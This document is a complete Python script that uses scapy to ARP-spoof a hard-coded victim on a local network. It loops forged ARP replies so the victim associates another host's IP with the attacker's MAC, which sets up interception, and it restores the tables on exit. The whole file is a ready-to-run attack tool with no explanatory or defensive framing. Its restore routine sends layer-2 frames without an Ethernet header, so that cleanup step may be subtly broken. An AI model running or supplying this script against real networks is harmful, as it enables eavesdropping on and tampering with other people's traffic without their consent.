import time
from scapy.all import ARP, Ether, srp, send, conf, sendp

# Define the target (victim) and the IP we want to impersonate.
TARGET_IP = "192.168.1.10"      # Victim's IP address.
SPOOFED_IP = "192.168.1.20"       # The IP address to impersonate.
conf.iface = "eth0"         # Sets the default interface to eth0

def get_mac(ip):
    """
    Send an ARP request to get the MAC address of the given IP.
    """
    print(f"[DEBUG] Getting MAC address for {ip}...")
    # Create ARP request and broadcast packet.
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp_request

    # Send packet and capture the response.
    answered_list = srp(packet, timeout=3, verbose=False)[0]

    if answered_list:
        mac = answered_list[0][1].hwsrc
        print(f"[DEBUG] Received MAC {mac} for IP {ip}")
        return mac
    else:
        print(f"[ERROR] No response for IP {ip}")
        return None

def spoof(target_ip, spoofed_ip):
    """
    Send a spoofed ARP reply to the target, telling it that the spoofed_ip
    is at our MAC address.
    """
    target_mac = get_mac(target_ip)
    if target_mac is None:
        print(f"[ERROR] Could not retrieve MAC for {target_ip}. Skipping spoof.")
        return

    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip)
    print(f"[DEBUG] Sending spoofed ARP reply: Telling {target_ip} that {spoofed_ip} is at our MAC.")
    sendp(packet, verbose=False)

def restore(destination_ip, source_ip):
    print(f"[INFO] Restoring ARP tables for {destination_ip}...")
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    if destination_mac is None or source_mac is None:
        print("[ERROR] Could not restore ARP entries due to missing MAC addresses.")
        return
    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac,
                 psrc=source_ip, hwsrc=source_mac)
    # Send the restoration packet multiple times.
    sendp(packet, count=4, verbose=False)
    print(f"[INFO] ARP tables restored for {destination_ip}.")

def main():
    print(f"[INFO] Starting ARP spoofing...")
    print(f"[INFO] Target: {TARGET_IP}, Impersonating: {SPOOFED_IP}")
    try:
        while True:
            spoof(TARGET_IP, SPOOFED_IP)
            # Sleep for 2 seconds between spoofing packets.
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[INFO] Detected CTRL+C! Stopping spoofing.")
        restore(TARGET_IP, SPOOFED_IP)
        print("[INFO] Exiting.")

if __name__ == "__main__":
    main()
